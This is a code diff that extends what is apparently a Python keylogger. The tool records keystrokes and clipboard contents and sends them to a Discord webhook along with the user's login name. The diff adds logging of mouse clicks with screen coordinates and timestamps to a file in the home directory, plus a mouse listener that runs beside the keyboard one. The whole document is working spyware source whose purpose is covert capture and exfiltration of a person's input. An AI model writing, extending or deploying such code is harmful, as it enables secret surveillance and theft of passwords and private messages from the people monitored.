@@ -20,13 +20,15 @@
 #       but try and seperate text based on inputs (if someone clicks, presses enter or tab or stuff like that
 #       then they likely arent typing in the same textbox anymore)
 
-from pynput import keyboard
+from pynput import keyboard, mouse
 from pathlib import Path
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import os
 import hashlib
 import pyperclip
+
+controller = mouse.Controller()
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
 clear_after_send = True
@@ -85,7 +87,17 @@ def check_if_should_send(lines):
 
 def ascii_replace(key):
     try:
-        if str(key) == "<12>":
+        if str(key) == "Button.left":
+            return "Mouse 1"
+        elif str(key) == "Button.right":
+            return "Mouse 2"
+        elif str(key) == "Button.middle":
+            return "Mouse 3"
+        elif str(key) == "Button.x1":
+            return "Mouse 4"
+        elif str(key) == "Button.x2":
+            return "Mouse 5"
+        elif str(key) == "<12>":
             return "numpad 5"
         elif str(key) == "<48>":
             return 0
@@ -250,8 +262,29 @@ def on_release(key):
     check_if_should_send(lines)
 
     if kill_switch():
+        controller.click(mouse.Button.left)
         webhook = DiscordWebhook(url=url, username="Keys")
-        embed = DiscordEmbed(title=f"Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
+        embed = DiscordEmbed(title=f"Keyboard: Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
+        webhook.add_embed(embed)
+        webhook.execute()
+        return False
+
+def on_click(x, y, button, pressed):
+    if pressed:
+        coords = f"{x}, {y}"
+        log = f"{ascii_replace(button).rjust(8)}: {str(coords).rjust(max_length)} | {datetime.now()}\n"
+        file_path = Path.home() / input_log_name
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+
+        if not file_path.exists():
+            file_path.write_text(log)
+        else:
+            with file_path.open('a') as file:
+                file.write(log)
+    
+    if kill_switch():
+        webhook = DiscordWebhook(url=url, username="Keys")
+        embed = DiscordEmbed(title=f"Mouse: Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
         webhook.add_embed(embed)
         webhook.execute()
         return False
@@ -271,7 +304,13 @@ if not kill_switch():
             response = webhook.execute()
 
             if response.status_code != 401:
-                with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
-                    l.join()
+                keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+                mouse_listener = mouse.Listener(on_click=on_click)
+
+                keyboard_listener.start()
+                mouse_listener.start()
+
+                keyboard_listener.join()
+                mouse_listener.join()
         except:
             pass
